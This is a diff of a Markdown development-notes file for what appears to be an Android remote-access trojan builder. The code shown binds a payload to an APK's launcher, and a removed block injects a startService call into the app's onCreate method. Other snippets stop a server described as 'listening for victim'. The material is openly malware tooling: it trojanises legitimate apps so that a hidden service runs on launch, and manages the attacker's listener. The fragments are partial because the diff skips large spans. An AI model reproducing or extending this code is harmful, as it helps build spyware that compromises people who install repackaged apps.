@@ -7,7 +7,10 @@ exec('java -jar ' + CONSTANTS.ApktoolJar + '" empty-framework-dir "'), (error, s
 }
 ```
 
-## New Complete Bind On Launch function for Windows, Linux & macOS!
+# New Complete Bind On Launch function for Windows, Linux & macOS!
+
+This one was a bit of a pain to manage, but it was done in the end, this future update will be used in the next release until something using `fs` can be constructed, in order to use less coding.
+
 ```js  
     $appCtrl.BindOnLauncher = (apkFolder) => {
 
@@ -313,9 +316,11 @@ function GetLauncherActivity(manifest) {
   }
 ```
 
-Code Updates that Still needs work
-------------------------------------------------------------------
-## Launcher Extraction for `<application` attribute | AppCtrl.js |
+# Server Updates that still need work
+
+All of the following code updates for the server, currently need more work done on them before they can be integrated.
+
+# Launcher Extraction for `<application` attribute | AppCtrl.js |
 ```javascript
 function GetLauncherActivity(manifest) {
 
@@ -371,25 +376,8 @@ function GetLauncherActivity(manifest) {
 
   }
 ```
-  
-
-## Sets of Code for the orgAppKey2
-```javascript
-exports.orgAppKey2 = ';->onCreate()V';
-```
-```javascript
-var key = CONSTANTS.orgAppKey2;
-$appCtrl.Log("Modifiying launcher activity...");
-var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
-fs.writeFile(launcherPath, output, 'utf8', (error) => {
-    if (error) {
-        $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
-        return;
-    }
-```
-    
-## Code Sets for function to stop listening | AppCtrl.js + main.js + build.html |
-#### Not far from done just need to debug and fix a few things
+# Code for Disconnect function
+- AppCtrl.js
 ```javascript
     // when user clicks Disconnect Button
     $appCtrl.Stop = (port) => {
@@ -419,6 +407,7 @@ fs.writeFile(launcherPath, output, 'utf8', (error) => {
       ipcRenderer.send('closeLabWindow', 'lab.html', index)
     }
 ```
+- main.js
 ```javascript 
 // fired when stopped listening for victim
 ipcMain.on("SocketIO:StopListen", function (event, port) {
@@ -468,6 +457,7 @@ process.on('uncaughtException', function (error) {
 
 });
 ```
+- index.html
 ```html
 <button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
 ```
